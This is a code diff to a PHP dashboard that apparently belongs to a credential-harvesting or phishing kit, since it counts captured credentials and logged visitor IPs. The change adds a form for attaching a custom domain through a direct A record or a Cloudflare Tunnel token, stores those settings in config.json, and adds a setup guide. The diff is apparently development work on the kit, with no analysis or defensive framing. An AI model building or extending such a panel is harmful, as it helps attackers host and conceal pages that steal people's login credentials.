@@ -32,14 +32,28 @@ if (file_exists($ip_file)) {
 $total_hits = count($ips);
 $total_creds = count($credentials);
 
-// Handle Domain Connection (Mock)
+// Handle Domain Connection
 $domain = "None Connected";
+$conn_type = "direct";
+$tunnel_token = "";
+
 if (isset($_POST['domain'])) {
     $domain = htmlspecialchars($_POST['domain']);
-    file_put_contents('config.json', json_encode(['domain' => $domain]));
+    $conn_type = htmlspecialchars($_POST['conn_type'] ?? 'direct');
+    $tunnel_token = htmlspecialchars($_POST['tunnel_token'] ?? '');
+    
+    $config_data = [
+        'domain' => $domain,
+        'conn_type' => $conn_type,
+        'tunnel_token' => $tunnel_token,
+        'updated_at' => date('Y-m-d H:i:s')
+    ];
+    file_put_contents('config.json', json_encode($config_data, JSON_PRETTY_PRINT));
 } elseif (file_exists('config.json')) {
     $config = json_decode(file_get_contents('config.json'), true);
     $domain = $config['domain'] ?? "None Connected";
+    $conn_type = $config['conn_type'] ?? "direct";
+    $tunnel_token = $config['tunnel_token'] ?? "";
 }
 
 ?>
@@ -110,15 +124,34 @@ if (isset($_POST['domain'])) {
 
             <div class="side-panel">
                 <div class="domain-connector">
-                    <h3>Connect Custom Domain</h3>
-                    <p style="font-size: 0.8rem; color: var(--text-secondary); margin: 10px 0;">Point your A record to your server IP or use a Cloudflare Tunnel.</p>
+                    <h3>Domain Connector</h3>
+                    <p style="font-size: 0.8rem; color: var(--text-secondary); margin: 10px 0;">Configure how your custom domain connects to this panel.</p>
                     <form method="POST">
                         <div class="input-group">
+                            <label style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 5px; display: block;">Connection Type</label>
+                            <select name="conn_type" style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); padding: 0.8rem; border-radius: 10px; color: white; margin-bottom: 1rem; outline: none;">
+                                <option value="direct" <?php echo $conn_type == 'direct' ? 'selected' : ''; ?>>Direct (A Record / IP)</option>
+                                <option value="tunnel" <?php echo $conn_type == 'tunnel' ? 'selected' : ''; ?>>Cloudflare Tunnel (Secure)</option>
+                            </select>
+
+                            <label style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 5px; display: block;">Custom Domain</label>
                             <input type="text" name="domain" placeholder="example.com" value="<?php echo $domain != 'None Connected' ? $domain : ''; ?>">
-                            <button type="submit" class="btn">Connect Domain</button>
+                            
+                            <div id="tunnel-field" style="display: <?php echo $conn_type == 'tunnel' ? 'block' : 'none'; ?>;">
+                                <label style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 5px; display: block;">Cloudflare Tunnel Token</label>
+                                <input type="text" name="tunnel_token" placeholder="eyJhIjoi..." value="<?php echo $tunnel_token; ?>">
+                            </div>
+
+                            <button type="submit" class="btn">Save & Connect</button>
                         </div>
                     </form>
                 </div>
+
+                <script>
+                    document.querySelector('select[name="conn_type"]').addEventListener('change', function() {
+                        document.getElementById('tunnel-field').style.display = this.value === 'tunnel' ? 'block' : 'none';
+                    });
+                </script>
 
                 <div class="panel" style="padding: 1.5rem;">
                     <h3>Recent Visitors</h3>
@@ -129,6 +162,24 @@ if (isset($_POST['domain'])) {
                                 <span style="color: var(--accent-primary);">Just now</span>
                             </div>
                         <?php endforeach; ?>
+                    </div>
+                </div>
+                <div class="panel" style="padding: 1.5rem; margin-top: 1.5rem;">
+                    <h3>Domain Setup Guide</h3>
+                    <div style="margin-top: 1rem; font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6;">
+                        <p style="margin-bottom: 10px;"><strong style="color: var(--accent-primary);">Cloudflare Tunnel (Recommended):</strong></p>
+                        <ol style="margin-left: 20px; margin-bottom: 15px;">
+                            <li>Go to Cloudflare Zero Trust Dashboard.</li>
+                            <li>Navigate to <strong>Networks > Tunnels</strong>.</li>
+                            <li>Create a new Tunnel and copy the <strong>Token</strong>.</li>
+                            <li>Paste the token above and save.</li>
+                        </ol>
+                        <p style="margin-bottom: 10px;"><strong style="color: var(--accent-primary);">Direct A Record:</strong></p>
+                        <ol style="margin-left: 20px;">
+                            <li>Go to your Domain DNS settings.</li>
+                            <li>Add an <strong>A Record</strong> pointing to your server's Public IP.</li>
+                            <li>Wait for DNS propagation (up to 24h).</li>
+                        </ol>
                     </div>
                 </div>
             </div>
